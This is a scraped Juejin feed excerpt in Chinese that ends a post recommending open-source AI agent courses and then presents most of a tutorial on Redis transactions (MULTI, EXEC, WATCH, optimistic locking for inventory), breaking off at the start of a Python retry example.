<p>你甚至不需要自己在本地配环境，浏览器点开就能跑，还能直接用 HF 提供的免费 Inference API。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/huggingface/agents-course</span>
</code></pre>
<h2 data-id="heading-4">05、微软开源的 Agents 教程</h2>
<p>继《机器学习入门》、《生成式 AI 入门》等神级教程火遍全球后，<strong>微软也对 Agent 下手了。</strong></p>
<p><strong>微软推出的 AI Agents for Beginners</strong> 已经 5 万的 Star </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/846d1d3f5f5942b6986b2b722dce2e38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=p5eIOwaM0cLR99%2FY2tdHg%2FfJ0hc%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>这是面向初学者的 10 节智能体开发课程，不同于市面上零散的教程，微软把<strong>企业级开发</strong>中验证过的模式和框架，通过 10 节循序渐进的课程，手把手教给你。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a7b40282bc243178f4d40027a0f3580~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=UJnMog5uF6V35TUS7ODZwhiC7Zo%3D" alt="图片" loading="lazy"/></p>
<p>这个课程会学习微软主推的 SDK Semantic Kernel，专注于将大模型集成到现有代码中，企业级应用的首选。还会应用处理复杂 Multi-Agent 协作的开源框架 AutoGen。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/381faafaa7b744c3864c4a35596ac6c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=nJYb6OondjScKNStkoyXOaTPtvk%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/microsoft/ai-agents-for-beginners</span>
</code></pre>
<h2 data-id="heading-5">06、6周学会AI智能体</h2>
<p>课程导师是 Ed Donner ，通过为期 <strong>6 周</strong>的实践学习，引导你掌握如何构建和部署自主 AI 智能体。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daa7441fe1dd4238a3f5b4973a3542ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=vvLyG2jo06AnodHaZPFdsZlNWKM%3D" alt="图片" loading="lazy"/></p>
<p>该项目最大的价值在于全框架覆盖<strong>与</strong>前沿技术跟进。它不仅横向对比并实战了 OpenAI Agents SDK、CrewAI、LangGraph、AutoGen 四大主流框架，还率先涵盖了最新的 <strong>MCP</strong>。而且你可以直接在 Cursor 里面学这个课程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fb56bde49b346da9e97710dfb2015cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939575&amp;x-signature=RjXl9bUJhA%2Ff1xf0aiTOpS2TdPM%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/ed-donner/agents</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis事务机制深度剖析：MULTI、EXEC与WATCH命令实战]]></title>    <link>https://juejin.cn/post/7581698635866701850</link>    <guid>https://juejin.cn/post/7581698635866701850</guid>    <pubDate>2025-12-10T02:38:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698635866701850" data-draft-id="7490815158190145562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis事务机制深度剖析：MULTI、EXEC与WATCH命令实战"/> <meta itemprop="keywords" content="Redis,数据库,性能优化"/> <meta itemprop="datePublished" content="2025-12-10T02:38:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Go高并发架构_王工"/> <meta itemprop="url" content="https://juejin.cn/user/446863555701561"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis事务机制深度剖析：MULTI、EXEC与WATCH命令实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/446863555701561/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Go高并发架构_王工
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:38:14.000Z" title="Wed Dec 10 2025 02:38:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读25分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">文章摘要（200-300字）</h2>
<p>Redis 作为一款高性能的内存数据库，以其极致的速度和灵活的数据结构广受开发者青睐。然而，在并发场景下，如何保证数据一致性成为一个绕不开的话题。Redis 的事务机制通过 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 命令，提供了一种轻量级的解决方案，虽然它不像传统关系型数据库那样支持完整的事务特性，却在特定场景下展现出独特优势。本文旨在深入剖析 Redis 事务的核心原理，帮助读者理解其工作机制、适用场景以及潜在局限。无论是使用 <code>MULTI</code> 和 <code>EXEC</code> 实现原子操作，还是借助 <code>WATCH</code> 实现乐观锁并发控制，我们都将结合实际项目经验，辅以代码示例和踩坑教训，带你从基础走向实战。文章特色在于：不仅讲解技术细节，还分享了作者在订单处理、库存扣减等场景中的实战心得，力求让每一位有 1-2 年 Redis 经验的开发者都能快速上手并优化自己的项目。无论你是想提升技能，还是解决实际问题，这篇文章都将是你的得力助手。</p>
<hr/>
<h2 data-id="heading-1">一、引言（约400-500字）</h2>
<h3 data-id="heading-2">1. Redis事务的背景与价值</h3>
<p>Redis 诞生于内存数据库的黄金时代，它的定位是“快而灵活”。凭借毫秒级的响应速度和丰富的数据结构，Redis 在缓存、队列、计数器等场景中大放异彩。然而，当业务逻辑涉及多个操作需要“要么全成功，要么全失败”时，单命令的原子性就显得捉襟见肘了。这时候，Redis 的事务机制应运而生。</p>
<p>与传统关系型数据库（如 MySQL）的事务相比，Redis 的事务更像是一个“轻装上阵”的助手。它不提供完整的 ACID（原子性、一致性、隔离性、持久性）保证，而是通过命令队列和延迟执行，实现了有限的原子性支持。这种设计牺牲了部分功能（如回滚），换来了更高的性能和更低的复杂度。试想一下，在一个电商系统中，库存扣减和订单生成必须同时完成，Redis 的事务就能派上用场。它适用于轻量级原子操作，比如批量更新缓存、积分累加、库存管理等场景。</p>
<h3 data-id="heading-3">2. 目标读者与文章结构</h3>
<p>如果你已经使用 Redis 1-2 年，熟悉基本命令但对事务机制还停留在“听说过”的阶段，这篇文章正是为你量身打造的。我们希望通过由浅入深的讲解，帮助你不仅理解 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 的原理，还能在项目中自信地应用它们。</p>
<p>文章将从基础知识开始，逐步深入到核心命令的剖析，再到实战案例和优化技巧。具体结构如下：</p>
<ul>
<li><strong>基础篇</strong>：带你认识 Redis 事务的本质和基本用法。</li>
<li><strong>剖析篇</strong>：拆解 <code>MULTI</code> 和 <code>EXEC</code> 的工作原理，揭示其优势与局限。</li>
<li><strong>实战篇</strong>：聚焦 <code>WATCH</code> 的乐观锁特性，结合库存扣减等场景实战演练。</li>
<li><strong>高级篇</strong>：探讨事务与 Lua 脚本的对比，以及分布式环境下的优化。</li>
<li><strong>经验篇</strong>：分享真实项目中的踩坑教训和最佳实践。</li>
<li><strong>总结篇</strong>：提炼核心要点并展望未来。</li>
</ul>
<p>从理论到实践，我们将用代码和经验为你铺平学习之路。接下来，让我们从 Redis 事务的基础开始，逐步揭开它的神秘面纱。</p>
<hr/>
<h2 data-id="heading-4">二、Redis事务机制基础（约600-800字）</h2>
<p>Redis 的事务机制虽然不像传统数据库那样复杂，但它却是 Redis 在并发场景下的一把“利器”。本章将带你从零开始认识 Redis 事务的核心概念和基本用法，为后续的深入剖析打下坚实基础。无论你是想快速上手，还是为实战做准备，这里都会给你一个清晰的起点。</p>
<h3 data-id="heading-5">1. 什么是Redis事务？</h3>
<p>Redis 的事务是一个命令序列的集合，这些命令要么全部执行，要么全部不执行。听起来是不是很像数据库事务？但别急，Redis 的事务更像是“轻量版”。它通过将多个命令放入队列并一次性执行，保证了一定程度的<strong>原子性</strong>，但对<strong>隔离性</strong>和<strong>一致性</strong>的支持有限，更别提回滚了。</p>
<p>与关系型数据库（如 MySQL）的事务相比，Redis 事务更像是一个“计划表”：你先列好要做的事（命令），然后交给 Redis 在某个时刻统一执行。MySQL 的事务可以回滚，Redis 却不行；MySQL 有锁机制保证隔离性，Redis 则更依赖客户端的配合。这种差异源于 Redis 的设计哲学：追求极致性能，简化复杂逻辑。</p>
<p><strong>表格1：Redis事务 vs 传统数据库事务对比</strong></p>



































<table><thead><tr><th>特性</th><th>Redis 事务</th><th>传统数据库事务 (如 MySQL)</th></tr></thead><tbody><tr><td>原子性</td><td>支持（有限）</td><td>完全支持</td></tr><tr><td>隔离性</td><td>部分支持（依赖 WATCH）</td><td>完全支持（锁机制）</td></tr><tr><td>一致性</td><td>依赖客户端逻辑</td><td>完全支持</td></tr><tr><td>回滚</td><td>不支持</td><td>支持</td></tr><tr><td>性能开销</td><td>低</td><td>较高</td></tr></tbody></table>
<h3 data-id="heading-6">2. 核心命令简介</h3>
<p>Redis 的事务机制主要围绕以下四个命令展开：</p>
<ul>
<li><strong><code>MULTI</code></strong>：事务的“开场白”，告诉 Redis 接下来的命令需要入队，而不是立即执行。</li>
<li><strong><code>EXEC</code></strong>：事务的“压轴戏”，触发队列中所有命令按顺序执行。</li>
<li><strong><code>DISCARD</code></strong>：事务的“撤退键”，放弃当前队列，清空未执行的计划。</li>
<li><strong><code>WATCH</code></strong>：事务的“哨兵”，监控指定键的变动，用于实现乐观锁。</li>
</ul>
<p>这些命令就像一个剧本的导演、演员和道具师，配合起来完成一场演出。接下来，我们通过工作流程看看它们如何“上台”。</p>
<h3 data-id="heading-7">3. 事务的基本工作流程</h3>
<p>Redis 事务的执行可以分为两个阶段：<strong>命令入队</strong>和<strong>执行阶段</strong>。用一个生活化的比喻来说，就像你在餐厅点餐：先把菜名报给服务员（入队），然后等服务员确认后一起上菜（执行）。</p>
<ul>
<li><strong>命令入队</strong>：调用 <code>MULTI</code> 后，后续命令不会立即执行，而是被放入一个队列。Redis 会返回 <code>QUEUED</code> 表示命令已入队。</li>
<li><strong>执行阶段</strong>：调用 <code>EXEC</code> 后，队列中的命令按顺序执行。如果中途有语法错误的命令，整个事务会失败；如果是运行时错误（如操作类型不匹配），则只影响该命令，其他命令照常执行。</li>
</ul>
<p><strong>示意图1：Redis事务基本流程</strong></p>
<pre><code class="hljs language-sql" lang="sql">[客户端]          [Redis服务器]
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
MULTI <span class="hljs-comment">-------------&gt; | 开启事务</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
命令<span class="hljs-number">1</span> <span class="hljs-comment">-------------&gt; | QUEUED</span>
命令<span class="hljs-number">2</span> <span class="hljs-comment">-------------&gt; | QUEUED</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
<span class="hljs-keyword">EXEC</span> <span class="hljs-comment">--------------&gt; | 执行队列中的命令</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
<span class="hljs-operator">&lt;</span><span class="hljs-comment">------------------- | 返回结果</span>
</code></pre>
<h3 data-id="heading-8">4. 代码示例</h3>
<p>让我们通过一个简单的例子感受一下事务的魅力。假设我们要更新用户的积分和最后更新时间，确保两者同时完成：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开启事务</span>
MULTI
<span class="hljs-comment"># 增加用户1001的积分</span>
INCR user:points:1001
<span class="hljs-comment"># 设置用户1001的最后更新时间</span>
SET user:last_update:1001 <span class="hljs-string">"2025-04-07"</span>
<span class="hljs-comment"># 执行事务</span>
EXEC
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>MULTI</code>：标志事务开始，后续命令被放入队列。</li>
<li><code>INCR</code>：将积分加 1，返回新的积分值。</li>
<li><code>SET</code>：设置时间戳，保证与积分更新同步。</li>
<li><code>EXEC</code>：触发队列执行，返回 <code>[2, "OK"]</code>，表示两个命令的结果。</li>
</ul>
<p>如果执行成功，积分和时间戳会同时更新；如果网络中断或语法错误，事务会整体失败。这种“全有或全无”的特性，正是 Redis 事务的核心价值。</p>
<p>通过本章，你已经掌握了 Redis 事务的基本概念和用法。但这只是“热身”，<code>MULTI</code> 和 <code>EXEC</code> 背后还有更多细节值得探索。比如，命令队列是如何管理的？事务失败时会发生什么？接下来，我们将深入剖析 <code>MULTI</code> 和 <code>EXEC</code> 的工作原理，带你看看这对“黄金搭档”的真面目。</p>
<hr/>
<h2 data-id="heading-9">三、MULTI与EXEC的深度剖析（约800-1000字）</h2>
<p>在 Redis 事务的舞台上，<code>MULTI</code> 和 <code>EXEC</code> 是绝对的主角。如果说上一章是让你“初识”它们，这一章则是带你“深入”它们的内核，拆解工作原理、分析优劣，并通过实战场景让你感受到它们的真正威力。准备好了吗？让我们一探究竟！</p>
<h3 data-id="heading-10">1. MULTI的工作原理</h3>
<p><code>MULTI</code> 是事务的起点，它的本质是为客户端创建一个命令队列。打个比喻，它就像一个“购物篮”，你把想买的东西（命令）一件件放进去，等到结账（<code>EXEC</code>）时再统一处理。在 Redis 的实现中，这个队列存储在客户端的内存上下文中，服务端会为每个开启事务的客户端维护一个独立状态。</p>
<h4 data-id="heading-11">命令队列的内存管理</h4>
<p>每调用一次 <code>MULTI</code>，Redis 会为当前连接分配一个事务状态结构体，里面包含一个命令列表。当你输入后续命令时，Redis 不会立即执行，而是将其封装成一个命令对象，标记为 <code>QUEUED</code> 并加入队列。这种延迟执行的设计，既保证了命令的顺序性，也降低了频繁交互的开销。</p>
<h4 data-id="heading-12">事务中的错误处理</h4>
<p>不过，队列并非万能。Redis 对错误的处理分为两类：</p>
<ul>
<li><strong>语法错误</strong>：比如输入了不存在的命令 <code>SETX</code>，在入队列时就会被检测到。调用 <code>EXEC</code> 时，整个事务会被直接取消。</li>
<li><strong>执行时错误</strong>：比如对字符串键执行 <code>LPUSH</code>，这种错误只有在 <code>EXEC</code> 执行时才会暴露，但不会影响其他命令的执行。</li>
</ul>
<p><strong>表格2：错误类型对比</strong></p>




















<table><thead><tr><th>错误类型</th><th>检测时机</th><th>对事务的影响</th></tr></thead><tbody><tr><td>语法错误</td><td>入队时</td><td>整个事务失败</td></tr><tr><td>执行时错误</td><td>执行时 (<code>EXEC</code>)</td><td>仅影响出错命令，其他继续</td></tr></tbody></table>
<h3 data-id="heading-13">2. EXEC的执行逻辑</h3>
<p><code>EXEC</code> 是事务的“执行官”，负责将队列中的命令逐一变为现实。它的核心在于<strong>原子性</strong>：一旦开始执行，队列中的命令会连续完成，不会被其他客户端的请求打断。这种特性得益于 Redis 的单线程事件循环模型。</p>
<h4 data-id="heading-14">原子性保证的边界</h4>
<p>但原子性也有边界。如果事务中包含语法错误的命令，<code>EXEC</code> 会返回空结果（<code>nil</code>），队列直接作废。此外，如果 Redis 服务端在执行过程中崩溃，事务的原子性就无法保证了。因此，事务的可靠性很大程度上依赖稳定的网络和服务器环境。</p>
<h4 data-id="heading-15">性能影响</h4>
<p>事务的长度直接影响性能。队列越长，执行时间越久，尤其是在高并发场景下，可能会阻塞其他请求。经验法则是：尽量保持事务“短小精悍”，避免把复杂逻辑塞进去。</p>
<h3 data-id="heading-16">3. 优势与局限性</h3>
<h4 data-id="heading-17">优势</h4>
<ul>
<li><strong>简单高效</strong>：相比传统数据库事务，Redis 事务无需锁机制，开销极低。</li>
<li><strong>轻量原子性</strong>：适合需要批量操作的场景，如缓存更新、计数器累加。</li>
</ul>
<h4 data-id="heading-18">局限性</h4>
<ul>
<li><strong>不支持回滚</strong>：一旦命令入队，无法中途撤销，失败了只能从头再来。</li>
<li><strong>错误处理复杂</strong>：客户端需要提前预判可能的问题，比如类型 mismatch。</li>
</ul>
<p><strong>示意图2：MULTI/EXEC 执行过程</strong></p>
<pre><code class="hljs language-sql" lang="sql">[客户端]          [Redis服务器]
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
MULTI <span class="hljs-comment">-------------&gt; | 创建队列</span>
<span class="hljs-keyword">SET</span> key1 val <span class="hljs-comment">------&gt; | QUEUED</span>
INCR key2 <span class="hljs-comment">---------&gt; | QUEUED</span>
<span class="hljs-keyword">EXEC</span> <span class="hljs-comment">--------------&gt; | 按序执行，返回 [OK, 2]</span>
</code></pre>
<h3 data-id="heading-19">4. 实战场景</h3>
<h4 data-id="heading-20">场景1：批量更新缓存数据</h4>
<p>假设我们需要同时更新用户的姓名和年龄到缓存中，确保两者一致：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开启事务</span>
MULTI
<span class="hljs-comment"># 设置用户1001的姓名</span>
SET cache:user:1001:name <span class="hljs-string">"Alice"</span>
<span class="hljs-comment"># 设置用户1001的年龄</span>
SET cache:user:1001:age <span class="hljs-string">"25"</span>
<span class="hljs-comment"># 执行事务</span>
EXEC
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>MULTI</code>：启动事务，命令开始入队。</li>
<li><code>SET</code>：分别设置两个键值对。</li>
<li><code>EXEC</code>：一次性执行，返回 <code>[OK, OK]</code>。</li>
</ul>
<h4 data-id="heading-21">踩坑经验：事务命令过多导致性能下降</h4>
<p>在一次项目中，我们尝试用事务批量更新 100 个键值对，结果发现延迟从 1ms 飙升到 50ms。分析后发现，事务队列过长导致执行时间增加。<strong>解决办法</strong>：将大事务拆分为多个小事务，每次处理 10-20 个命令，性能恢复正常。</p>
<p><strong>最佳实践建议</strong>：</p>
<ul>
<li><strong>控制事务规模</strong>：单次事务尽量不超过 20 个命令。</li>
<li><strong>预检查数据</strong>：入队前验证键类型，避免执行时错误。</li>
</ul>
<p>通过本章，你已经摸清了 <code>MULTI</code> 和 <code>EXEC</code> 的“脾气”：简单高效，但也有局限。接下来，我们将迎来一个更有趣的角色——<code>WATCH</code>，它为事务引入了乐观锁机制，让并发控制变得更灵活。想知道如何用它解决库存扣减的难题？请继续关注下一章！</p>
<hr/>
<h2 data-id="heading-22">四、WATCH命令与乐观锁实战（约1000-1200字）</h2>
<p>如果说 <code>MULTI</code> 和 <code>EXEC</code> 是 Redis 事务的“基础套餐”，那么 <code>WATCH</code> 就是一道“加料大餐”，为事务注入了并发控制的能力。在高并发场景下，如何确保数据一致性而不引入昂贵的锁开销？<code>WATCH</code> 给出了一个优雅的答案。本章将带你深入理解它的原理，剖析工作流程，并通过实战案例展示它的威力。准备好迎接一场“乐观锁”的冒险吧！</p>
<h3 data-id="heading-23">1. WATCH的核心原理</h3>
<h4 data-id="heading-24">乐观锁的基本概念</h4>
<p><code>WATCH</code> 是 Redis 实现<strong>乐观锁</strong>的关键。什么是乐观锁？想象你在编辑一篇共享文档：你先下载一份副本，修改后再提交。如果提交时发现别人已经改了原文档，你就得重新开始。乐观锁假设冲突不常发生，因此不提前加锁，而是通过版本检查来判断是否需要重试。</p>
<p>在 Redis 中，<code>WATCH</code> 监控一个或多个键。如果这些键在事务执行前被其他客户端修改，事务就会失败。这种机制避免了悲观锁的资源争抢，非常适合高并发、读多写少的场景。</p>
<h4 data-id="heading-25">WATCH如何监控键的修改</h4>
<p>调用 <code>WATCH</code> 后，Redis 会为被监控的键记录一个“快照”。在 <code>EXEC</code> 执行前，Redis 会检查这些键是否被修改（比如通过 <code>SET</code>、<code>INCR</code> 等命令）。如果有变化，事务会被取消，<code>EXEC</code> 返回 <code>nil</code>。</p>
<h3 data-id="heading-26">2. WATCH的工作流程</h3>
<p><code>WATCH</code> 通常与 <code>MULTI</code> 和 <code>EXEC</code> 配合使用，整个流程可以分为三个阶段：</p>
<ol>
<li><strong>监控阶段</strong>：调用 <code>WATCH</code> 指定要监控的键。</li>
<li><strong>准备阶段</strong>：读取键值，基于当前数据准备事务命令。</li>
<li><strong>执行阶段</strong>：用 <code>MULTI</code> 和 <code>EXEC</code> 提交事务，如果键被修改则失败。</li>
</ol>
<p><strong>示意图3：WATCH工作流程</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">[客户端A]         [Redis服务器]         [客户端B]
  |                  |                    |
WATCH <span class="hljs-keyword">key</span> ---------&gt; | 监控 <span class="hljs-keyword">key</span>           |
<span class="hljs-keyword">GET</span> <span class="hljs-keyword">key</span> -----------&gt; | 返回当前值         |
  |                  |                    |
MULTI -------------&gt; | 开启事务           | <span class="hljs-keyword">SET</span> <span class="hljs-keyword">key</span> new_val --&gt; | 修改 <span class="hljs-keyword">key</span>
命令<span class="hljs-number">1</span> -------------&gt; | QUEUED             |
EXEC --------------&gt; | 检查 <span class="hljs-keyword">key</span> 被修改，  |
  |                  | 返回 nil           |
</code></pre>
<h3 data-id="heading-27">3. 优势与特色</h3>
<ul>
<li><strong>轻量级并发控制</strong>：无需锁住资源，性能开销极低。</li>
<li><strong>适用场景</strong>：特别适合瞬时高并发的场景，如秒杀、库存扣减。</li>
</ul>
<p>但它也有局限：事务失败后需要客户端主动重试，增加了开发复杂度。</p>
<h3 data-id="heading-28">4. 实战案例</h3>
<h4 data-id="heading-29">场景：电商库存扣减</h4>
<p>在电商系统中，库存扣减是一个经典的并发问题。我们希望确保库存不会超卖，同时避免锁的开销。以下是一个使用 <code>WATCH</code> 的实现：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 监控库存键</span>
WATCH stock:product:1001
<span class="hljs-comment"># 获取当前库存</span>
GET stock:product:1001
<span class="hljs-comment"># 假设返回 "10"，检查是否足够</span>
<span class="hljs-comment"># 如果库存 &gt;= 购买数量，则继续</span>
MULTI
<span class="hljs-comment"># 减少库存</span>
DECR stock:product:1001
<span class="hljs-comment"># 执行事务</span>
EXEC
<span class="hljs-comment"># 如果返回 nil，说明库存被其他客户端修改，需重试</span>
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>WATCH</code>：监控库存键，确保事务期间不被篡改。</li>
<li><code>GET</code>：读取当前库存，用于判断是否可扣减。</li>
<li><code>DECR</code>：减少库存，原子操作。</li>
<li><code>EXEC</code>：提交事务，返回结果。如果返回 <code>nil</code>，表示事务失败。</li>
</ul>
<h4 data-id="heading-30">踩坑经验：WATCH滥用导致重试过多</h4>
<p>在一次秒杀活动中，我们对多个键（如库存、用户限购次数）都用了 <code>WATCH</code>，结果高并发下事务失败率飙升，客户端陷入频繁重试。分析发现，监控过多键增加了冲突概率。<strong>解决办法</strong>：只监控核心键（如库存），其他逻辑通过业务层校验，失败率降低到 5% 以下。</p>
<h4 data-id="heading-31">重试逻辑示例</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
